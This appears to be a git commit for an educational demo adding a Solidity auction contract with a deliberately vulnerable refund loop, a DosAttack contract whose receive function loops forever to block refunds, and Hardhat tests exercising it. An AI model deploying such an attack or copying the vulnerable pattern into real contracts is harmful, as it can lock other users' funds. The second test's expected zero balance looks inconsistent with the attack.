4ee28ecc3995749293c4135a5fd56f31abe2bc17
MrNubOK <vadzim.shadryn@gmail.com>
2022-09-23 13:45:53 +0300

    dos in contract

---
+++ contracts/Dos.sol
@@ -0,0 +1,72 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity ^0.8.0;
+
+contract Auction {
+    address owner;
+    mapping(address => uint) public bidders;
+    address[] public allBidders;
+    uint refundProgress;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    modifier onlyOwner() {
+        require(owner == msg.sender, "You're not an owner");
+        _;
+    }
+
+    function bid() external payable {
+        bidders[msg.sender] += msg.value;
+        allBidders.push(msg.sender);
+    }
+
+    function currentlyBalance() external view returns(uint) {
+        return address(this).balance;
+    }
+
+    function refund() external onlyOwner {
+        for (uint i = refundProgress; i < allBidders.length; i++) {
+            address bidder = allBidders[i];
+            
+            (bool success,) = bidder.call{value: bidders[bidder]}("");
+
+            require(success, "failed");
+
+            refundProgress++;
+        }
+    }
+}
+
+contract DosAttack {
+    Auction auction;
+    bool public blocked;
+    address payable owner;
+
+    constructor(address dosContractAddress) {
+        owner = payable(msg.sender);
+        auction = Auction(dosContractAddress);
+    }
+
+    modifier onlyOwner() {
+        require(owner == msg.sender, "You're not an owner");
+        _;
+    }
+
+    function bid() payable external onlyOwner {
+        auction.bid{value: msg.value}();
+    }
+
+    function toggleBlocked() external onlyOwner {
+        blocked = !blocked;
+    }
+
+    receive() external payable {
+        if (blocked) {
+            while(true) {}
+        } else {
+            owner.transfer(msg.value);
+        }
+    }
+}
---
+++ test/dos.test.js
@@ -0,0 +1,60 @@
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
+
+describe("Dos test", () => {
+    let auctionOwner, bidder1, bidder2, mamkinHuyaker;
+    let auction, dosContract;
+
+    beforeEach(async () => {
+        [auctionOwner, bidder1, bidder2, mamkinHuyaker] = await ethers.getSigners()
+        const Auction = await ethers.getContractFactory("Auction", auctionOwner)
+        auction = await Auction.deploy()
+        await auction.deployed()
+
+        const DosAttack = await ethers.getContractFactory("DosAttack", mamkinHuyaker)
+        dosContract = await DosAttack.deploy(auction.address)
+        await dosContract.deployed()
+    })
+
+    it("Auction with dos. Without block", async () => {
+        const bidTx1 = await auction.connect(bidder1).bid({value: ethers.utils.parseEther("2.0")})
+        await bidTx1.wait() 
+
+        const bidTx2 = await auction.connect(bidder2).bid({value: ethers.utils.parseEther("3.0")})
+        await bidTx2.wait() 
+
+
+        expect (await auction.currentlyBalance())
+            .to.be.eq(ethers.utils.parseEther("5.0"))
+
+        const bidTx3 = await dosContract.connect(mamkinHuyaker).bid({value: ethers.utils.parseEther("0.000000000001")})
+        await bidTx3.wait() 
+
+        await auction.connect(auctionOwner).refund()
+
+        expect (await auction.currentlyBalance())
+            .to.be.eq(ethers.utils.parseEther("0.0"))
+    })
+
+    it("Auction with dos. With block", async () => {
+        const bidTx1 = await auction.connect(bidder1).bid({value: ethers.utils.parseEther("2.0")})
+        await bidTx1.wait() 
+
+        const bidTx2 = await auction.connect(bidder2).bid({value: ethers.utils.parseEther("3.0")})
+        await bidTx2.wait() 
+
+
+        expect (await auction.currentlyBalance())
+            .to.be.eq(ethers.utils.parseEther("5.0"))
+
+        const bidTx3 = await dosContract.connect(mamkinHuyaker).bid({value: ethers.utils.parseEther("0.000000000001")})
+        await bidTx3.wait() 
+
+        await dosContract.connect(mamkinHuyaker).toggleBlocked()
+        blocked = await dosContract.blocked()
+        await auction.connect(auctionOwner).refund()
+
+        expect (await auction.currentlyBalance())
+            .to.be.eq(ethers.utils.parseEther("0.0"))
+    })
+})
